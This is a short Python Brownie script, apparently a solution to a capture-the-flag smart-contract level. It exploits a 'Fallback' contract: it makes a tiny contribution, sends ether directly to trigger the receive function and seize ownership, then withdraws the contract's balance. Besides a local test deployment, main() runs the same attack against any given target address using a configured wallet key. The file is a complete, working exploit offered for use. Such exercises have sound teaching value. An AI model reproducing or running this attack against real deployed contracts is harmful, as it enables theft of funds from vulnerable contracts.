from brownie import accounts, config, interface, web3, Fallback

def attack(target, hacker):
    fallback = interface.IFallback(target)
    # to ensure that contributions[hacker] will be greater than 0
    fallback.contribute({'from': hacker, 'amount': '0.0005 ether'})
    # call 'receive'
    hacker.transfer(to=target, amount="0.001 ether")
    print(f"Owner is hacker: {fallback.owner() == hacker.address}")
    fallback.withdraw({'from': hacker})
    print(f"Final contract balance: {web3.eth.getBalance(target)}")

def fake():
    owner = accounts[0]
    hacker = accounts[1]
    fallback = Fallback.deploy({'from': owner})
    attack(fallback.address, hacker)

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    attack(target, hacker)

    